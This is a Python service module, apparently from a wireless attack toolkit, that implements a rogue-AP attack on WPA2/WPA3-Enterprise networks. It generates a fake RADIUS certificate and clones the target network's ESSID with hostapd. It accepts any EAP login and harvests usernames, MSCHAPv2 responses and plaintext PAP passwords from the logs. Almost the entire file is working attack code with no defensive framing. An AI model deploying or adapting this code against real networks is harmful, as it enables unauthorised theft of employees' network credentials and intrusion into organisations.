"""
Enterprise Attack Service — WPA2/WPA3-Enterprise (802.1X/EAP).

Sets up a rogue RADIUS server + Evil Twin AP to intercept
enterprise credentials when clients attempt EAP authentication.

Attack flow:
1. Create rogue AP with same ESSID as enterprise network
2. Run FreeRADIUS with accept-all config to capture EAP exchanges
3. Deauth clients from legitimate AP (optional)
4. Clients connect to rogue AP and send credentials via EAP
5. Capture username/password hashes from RADIUS logs

Requires: hostapd + freeradius (or hostapd-mana)
"""

import uuid
import asyncio
import logging
from datetime import datetime
from typing import Optional
from app.config import settings
from app.models.schemas import EnterpriseAttackRequest
from app.utils.process_manager import process_manager

logger = logging.getLogger(__name__)


class EnterpriseService:
    def __init__(self):
        self._active: Optional[dict] = None
        self._captured_creds: list[dict] = []

    async def start(self, req: EnterpriseAttackRequest) -> dict:
        """Start enterprise credential capture attack."""
        attack_id = str(uuid.uuid4())[:8]
        log_file = str(settings.LOGS_DIR / f"enterprise_{attack_id}.log")

        # ── Generate self-signed certificate for EAP ──
        cert_dir = settings.ENTERPRISE_DIR / attack_id
        cert_dir.mkdir(exist_ok=True)

        await process_manager.run_sync([
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", str(cert_dir / "server.key"),
            "-out", str(cert_dir / "server.pem"),
            "-days", "365", "-nodes",
            "-subj", "/CN=radius.local/O=FakeRadius/C=US",
        ], timeout=15)

        # ── Generate hostapd-wpe config (enterprise mode) ──
        hostapd_conf = str(settings.HOSTAPD_DIR / f"enterprise_{attack_id}.conf")
        config = (
            f"interface={req.ap_interface}\n"
            f"driver=nl80211\n"
            f"ssid={req.target_essid}\n"
            f"channel={req.channel}\n"
            f"hw_mode=g\n"
            f"ieee8021x=1\n"
            f"eap_server=1\n"
            f"eap_user_file={cert_dir}/eap_users\n"
            f"ca_cert={cert_dir}/server.pem\n"
            f"server_cert={cert_dir}/server.pem\n"
            f"private_key={cert_dir}/server.key\n"
            f"wpa=2\n"
            f"wpa_key_mgmt=WPA-EAP\n"
            f"rsn_pairwise=CCMP\n"
            f"auth_algs=3\n"
            f"wpa_pairwise=CCMP\n"
        )

        with open(hostapd_conf, "w") as f:
            f.write(config)

        # Create EAP user file (accept all with MSCHAP)
        eap_users_file = str(cert_dir / "eap_users")
        eap_users = (
            '* PEAP,TTLS\n'
            '"t" TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP "password" [2]\n'
        )
        with open(eap_users_file, "w") as f:
            f.write(eap_users)

        # ── Configure interface ──
        await process_manager.run_sync(
            ["ip", "addr", "flush", "dev", req.ap_interface], timeout=5
        )
        await process_manager.run_sync(
            ["ip", "addr", "add", "10.0.0.1/24", "dev", req.ap_interface], timeout=5
        )
        await process_manager.run_sync(
            ["ip", "link", "set", req.ap_interface, "up"], timeout=5
        )

        # ── Start hostapd with enterprise config ──
        hostapd_proc = asyncio.create_task(
            process_manager.run(
                ["hostapd", hostapd_conf, "-f", log_file],
                timeout=None,
            )
        )

        self._active = {
            "id": attack_id,
            "essid": req.target_essid,
            "channel": req.channel,
            "eap_type": req.eap_type,
            "ap_interface": req.ap_interface,
            "log_file": log_file,
            "cert_dir": str(cert_dir),
            "started_at": datetime.now().isoformat(),
        }

        return self._active

    async def stop(self) -> dict:
        """Stop enterprise attack and extract captured credentials."""
        # Kill processes
        await process_manager.run_sync(["pkill", "-f", "hostapd"], timeout=5)

        # Parse log file for captured credentials
        creds = []
        if self._active and self._active.get("log_file"):
            try:
                import re
                with open(self._active["log_file"]) as f:
                    log_content = f.read()

                # Look for EAP identity and MSCHAP exchanges
                identities = re.findall(r"EAP-Identity.*?'(.+?)'", log_content)
                mschap = re.findall(r"MSCHAPV2.*?response.*?([0-9a-fA-F:]+)", log_content)

                for ident in identities:
                    creds.append({
                        "type": "eap_identity",
                        "username": ident,
                        "timestamp": datetime.now().isoformat(),
                    })

                # Also check for plaintext PAP passwords in logs
                pap = re.findall(r"PAP.*?password.*?'(.+?)'", log_content)
                for pw in pap:
                    creds.append({"type": "pap_password", "password": pw})

            except FileNotFoundError:
                pass

        self._captured_creds.extend(creds)
        active = self._active
        self._active = None

        return {
            "stopped": True,
            "attack": active,
            "captured_credentials": creds,
            "total_creds_captured": len(creds),
        }

    def status(self) -> dict:
        return {
            "active": self._active is not None,
            "attack": self._active,
            "captured_credentials": len(self._captured_creds),
        }

    def get_captured_creds(self) -> list[dict]:
        return self._captured_creds


enterprise_service = EnterpriseService()
